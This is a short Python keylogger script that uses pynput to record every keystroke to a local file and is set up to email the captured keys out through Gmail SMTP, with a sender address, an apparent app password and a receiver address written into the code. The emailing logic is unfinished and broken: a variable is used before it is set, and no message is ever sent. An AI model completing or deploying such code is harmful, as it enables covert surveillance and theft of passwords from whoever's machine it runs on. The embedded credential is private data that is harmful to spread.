from pynput import keyboard
from email.message import EmailMessage
import ssl
import smtplib

emailer = "logger274@gmail.com"
emailerPassword = "aaybvlfbvjdjafsv"
receiver = "ariellewmaltese@gmail.com"

subject = ('Key Logger')


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            keyInput = key.char
            logKey.write(keyInput + "\n")
        except:
            print('Error getting char')

    with open("keyfile.txt", "r") as logFile:
        lines = logFile.readlines()

        if len(lines) >= 10:
            for i in range(10):
                body = f"{body} "
            for i in range(10):
                del lines[10 - i - 1]

        with open("keyfile.txt", "w") as logFile:
            logFile.writelines(lines)


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

